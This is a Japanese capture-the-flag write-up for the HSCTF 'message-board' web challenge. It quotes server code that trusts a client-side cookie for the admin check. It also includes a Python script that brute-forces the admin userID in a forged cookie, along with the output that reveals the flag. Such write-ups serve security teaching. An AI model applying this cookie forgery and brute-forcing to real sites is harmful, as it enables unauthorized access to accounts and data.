# message-board:web:Xpts<!--X-->
Your employer, LameCompany, has lots of gossip on its company message board: [message-board.hsc.tf](https://message-board.hsc.tf/). You, Kupatergent, are able to access some of the tea, but not all of it! Unsatisfied, you figure that the admin user must have access to ALL of the tea. Your goal is to find the tea you've been missing out on.  
Your login credentials: username: `kupatergent` password: `gandal`  
Server code is attached (slightly modified).  
[message-board-master.zip](message-board-master.zip)  

# Solution
アクセスするとログインフォームが表示されるので指定された情報でログインする。  
LameCompany: Message Board  
[site.png](site/site.png)  
「no flag for you」と言われて何も見つけることができない。  
配布されたソースのapp.jsを見てみる。  
```JavaScript
~~~
const users = [
    {
        userID: "972",
        username: "kupatergent",
        password: "gandal"
    },
    {
        userID: "***",
        username: "admin"
    }
]

app.get("/", (req, res) => {
    const admin = users.find(u => u.username === "admin")
    if(req.cookies && req.cookies.userData && req.cookies.userData.userID) {
        const {userID, username} = req.cookies.userData
        if(req.cookies.userData.userID === admin.userID) res.render("home.ejs", {username: username, flag: process.env.FLAG})
        else res.render("home.ejs", {username: username, flag: "no flag for you"})
    } else {
        res.render("unauth.ejs")
    }
})
~~~
```
cookieを確認しており、`username`が`admin`だった場合`userID`を確認してflagを表示しているようだ。  
`admin`はパスワードでログインできないようであり、`userID`は隠蔽されている。  
SSTIよりRCEでapp.jsを読み取ることも試したが、難しそうだ。  
`userID`を総当たりで解析するのはナンセンスだと思ったが以下のbfadmin.pyで試す。  
ちなみにkupatergentのcookieは`userData=j%3A%7B%22userID%22%3A%22972%22%2C%22username%22%3A%22kupatergent%22%7D`となっていた。  
```python:bfadmin.py
import requests

for i in range(1000):
    print(i)
    start = i
    r = requests.get("https://message-board.hsc.tf/", cookies={"userData": f"j%3A%7B%22userID%22%3A%22{i}%22%2C%22username%22%3A%22admin%22%7D"})
    if ("flag{" in r.text) or (r.status_code != 200):
        print(r.text)
        break
```
以下のように実行する。  
```bash
$ python bfadmin.py
0
1
2
~~~
766
767
768
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LameCompany: Message Board</title>
~~~
        <p><strong data-bs-toggle="tooltip" title="has had enough of this bs">Rosa:</strong> Okay, I'm heading out.</p>
        <p><strong data-bs-toggle="tooltip" title="what a cool name">HSCTF:</strong> flag{y4m_y4m_c00k13s}</p>
    </div>
</div>
~~~
```
flagが得られた。  
`admin`の`userID`は`768`だったようだ。  

## flag{y4m_y4m_c00k13s}